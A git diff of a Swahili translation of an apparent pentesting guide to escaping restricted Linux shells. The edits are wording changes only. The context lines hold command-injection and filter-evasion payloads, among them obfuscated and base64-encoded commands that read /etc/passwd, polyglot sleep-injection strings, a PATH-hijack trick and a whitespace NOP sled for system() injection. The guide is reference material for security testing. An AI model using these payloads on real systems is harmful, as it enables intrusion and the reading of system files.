@@ -78,7 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Pita maeneo yaliyokatazwa
+### Pita nafasi zilizokatazwa
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -110,7 +110,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Kupita mabomba
+### Bypass pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -144,7 +144,7 @@ Unaweza kutumia **burpcollab** au [**pingb**](http://pingb.in) kwa mfano.
 
 ### Builtins
 
-Iwapo huwezi kutekeleza kazi za nje na una ufikiaji tu wa **seti ndogo ya builtins kupata RCE**, kuna mbinu kadhaa za kufanya hivyo. Kawaida **hutoweza kutumia zote** za **builtins**, hivyo unapaswa **kujua chaguzi zako zote** ili kujaribu kupita gerezani. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
+Iwapo huwezi kutekeleza kazi za nje na una ufikiaji tu wa **seti ndogo ya builtins ili kupata RCE**, kuna mbinu kadhaa za kufanya hivyo. Kawaida **hutoweza kutumia zote** za **builtins**, hivyo unapaswa **kujua chaguzi zako zote** ili kujaribu kupita gerezani. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
 Kwanza kabisa angalia zote [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Hapa kuna baadhi ya **mapendekezo**:
 ```bash
 # Get list of builtins
@@ -197,7 +197,7 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### Uingiliaji wa amri wa polyglot
+### Polyglot command injection
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
@@ -296,7 +296,7 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-Ikiwa uko ndani ya mfumo wa faili wenye **kinga za kusoma tu na noexec** au hata katika kontena lisilo na mfumo, bado kuna njia za **kutekeleza binaries zisizo na mpangilio, hata shell!:**
+Ikiwa uko ndani ya mfumo wa faili wenye **kinga za read-only na noexec** au hata katika kontena lisilo na mfumo, bado kuna njia za **kutekeleza binaries zisizo na mipaka, hata shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -310,7 +310,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Wakati udhaifu unakuruhusu kudhibiti sehemu fulani ya hoja ambayo hatimaye inafikia `system()` au shell nyingine, huenda usijue offset halisi ambapo utekelezaji unaanza kusoma payload yako.  NOP sleds za jadi (mfano `\x90`) **hazifanyi kazi** katika sintaksia ya shell, lakini Bash itapuuzilia mbali nafasi za mbele kabla ya kutekeleza amri.
+Wakati udhaifu unakuruhusu kudhibiti sehemu ya hoja ambayo hatimaye inafikia `system()` au shell nyingine, huenda usijue offset halisi ambapo utekelezaji unaanza kusoma payload yako.  NOP sleds za jadi (mfano `\x90`) **hazifanyi kazi** katika sintaksia ya shell, lakini Bash itapuuzilia mbali nafasi za mbele kabla ya kutekeleza amri.
 
 Hivyo unaweza kuunda *NOP sled kwa Bash* kwa kuweka amri yako halisi kwa mfululizo mrefu wa nafasi au tab characters:
 ```bash
@@ -326,7 +326,7 @@ Matumizi halisi:
 2. Hali ambapo mshambuliaji hawezi kuandika bytes za NULL ili kuoanisha payload.
 3. Vifaa vilivyojumuishwa ambavyo vinaweza tu kutumia BusyBox `ash`/`sh` – pia vinapuuzilia mbali nafasi za mbele.
 
-> 🛠️  Changanya hila hii na vifaa vya ROP vinavyopiga simu `system()` ili kuongeza kwa kiasi kikubwa uaminifu wa exploit kwenye route za IoT zenye ukosefu wa kumbukumbu.
+> 🛠️  Changanya hila hii na ROP gadgets zinazopiga simu `system()` ili kuongeza kwa kiasi kikubwa uaminifu wa exploit kwenye route za IoT zenye ukosefu wa kumbukumbu.
 
 ## Marejeleo na Zaidi
 
